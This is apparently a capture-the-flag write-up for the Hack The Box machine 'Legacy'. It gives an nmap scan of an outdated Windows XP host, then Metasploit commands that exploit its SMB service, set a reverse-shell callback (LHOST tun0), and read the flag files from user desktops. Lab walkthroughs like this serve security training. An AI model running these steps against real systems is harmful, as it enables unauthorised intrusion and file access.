# HTB Legacy
# OS: Windows
# Difficulty: Easy

# Enumeration:
I'll start with a port scan.
```bash
nmap -oN outputNMAP.txt -sC -sV -p- 10.129.179.141
```

```bash
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-08-24T12:25:09+03:00
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:bd:ba (VMware)
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
```

# Foothold:
The port scan reveals that the OS is outdated.
I'll open msfconsole and use an exploit for Windows SMB service.

```bash
sudo msfconsole -q
search exploit/windows/smb/ xp
use 69
set RHOSTS 10.129.179.141
set LHOST tun0
exploit

getuid
```
[shell](IMG/IMG1.png)

It worked.

# Flags:

Let's get the flags:
```bash
cd C:\\Documents\ and\ Settings
cat Administrator\\Desktop\\root.txt

cat john\\Desktop\\user.txt
```

### We got the flags!